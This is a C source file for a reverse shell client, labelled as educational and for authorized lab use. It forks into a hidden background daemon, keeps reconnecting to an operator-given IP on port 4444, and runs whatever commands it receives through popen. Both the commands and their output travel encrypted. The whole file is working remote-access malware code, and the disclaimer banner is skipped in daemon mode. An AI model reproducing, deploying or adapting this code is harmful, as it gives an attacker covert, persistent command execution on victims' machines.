// Codes by vision

#define _POSIX_C_SOURCE 200809L

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/stat.h>
#include "../common/crypto.h"

#define DEFAULT_PORT 4444
#define RETRY_DELAY 5

int daemonize() {
    pid_t pid = fork();
    
    if (pid < 0) {
        return -1;
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    
    if (setsid() < 0) {
        return -1;
    }
    
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    
    pid = fork();
    
    if (pid < 0) {
        return -1;
    }
    
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    
    umask(0);
    chdir("/");
    
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    return 0;
}

int connect_to_server(const char *server_ip, int port) {
    int sock;
    struct sockaddr_in server_addr;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        return -1;
    }

    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);

    if (inet_pton(AF_INET, server_ip, &server_addr.sin_addr) <= 0) {
        close(sock);
        return -1;
    }

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        close(sock);
        return -1;
    }

    return sock;
}

void execute_command(const char *command, char *output, size_t output_size) {
    FILE *fp;
    size_t total_read = 0;
    size_t bytes_read;

    memset(output, 0, output_size);

    fp = popen(command, "r");
    if (fp == NULL) {
        snprintf(output, output_size, "Error: Failed to execute command\n");
        return;
    }

    while ((bytes_read = fread(output + total_read, 1, output_size - total_read - 1, fp)) > 0) {
        total_read += bytes_read;
        if (total_read >= output_size - 1) {
            break;
        }
    }

    if (total_read == 0) {
        snprintf(output, output_size, "Command executed (no output)\n");
    }

    pclose(fp);
}

void run_client(const char *server_ip, int port, int daemon_mode) {
    int sock;
    char buffer[BUFFER_SIZE];
    char output[BUFFER_SIZE];
    ssize_t bytes_received;

    if (daemon_mode) {
        if (daemonize() < 0) {
            exit(EXIT_FAILURE);
        }
    }

    while (1) {
        sock = connect_to_server(server_ip, port);
        
        if (sock < 0) {
            sleep(RETRY_DELAY);
            continue;
        }

        while (1) {
            memset(buffer, 0, BUFFER_SIZE);
            
            bytes_received = recv(sock, buffer, BUFFER_SIZE - 1, 0);
            
            if (bytes_received <= 0) {
                break;
            }

            decrypt_data(buffer, bytes_received);
            buffer[bytes_received] = '\0';

            execute_command(buffer, output, BUFFER_SIZE);

            encrypt_data(output, strlen(output));

            if (send(sock, output, strlen(output), 0) < 0) {
                break;
            }
        }

        close(sock);
        sleep(RETRY_DELAY);
    }
}

int main(int argc, char *argv[]) {
    char *server_ip = "127.0.0.1";
    int port = DEFAULT_PORT;
    int daemon_mode = 0;

    if (argc < 2) {
        printf("Usage: %s <server_ip> [port] [-d for daemon mode]\n", argv[0]);
        printf("Example: %s 192.168.1.100 4444\n", argv[0]);
        printf("Example: %s 192.168.1.100 4444 -d\n", argv[0]);
        return EXIT_FAILURE;
    }

    server_ip = argv[1];

    if (argc >= 3 && strcmp(argv[2], "-d") != 0) {
        port = atoi(argv[2]);
    }

    for (int i = 2; i < argc; i++) {
        if (strcmp(argv[i], "-d") == 0) {
            daemon_mode = 1;
        }
    }

    if (!daemon_mode) {
        printf("===========================================\n");
        printf("  Educational Reverse Shell - Client\n");
        printf("  For Authorized Lab Use Only\n");
        printf("===========================================\n\n");
        printf("[*] Connecting to %s:%d\n", server_ip, port);
        printf("[*] Auto-reconnect enabled (delay: %d seconds)\n", RETRY_DELAY);
        printf("[*] Press Ctrl+C to stop\n\n");
    }

    run_client(server_ip, port, daemon_mode);

    return 0;
}
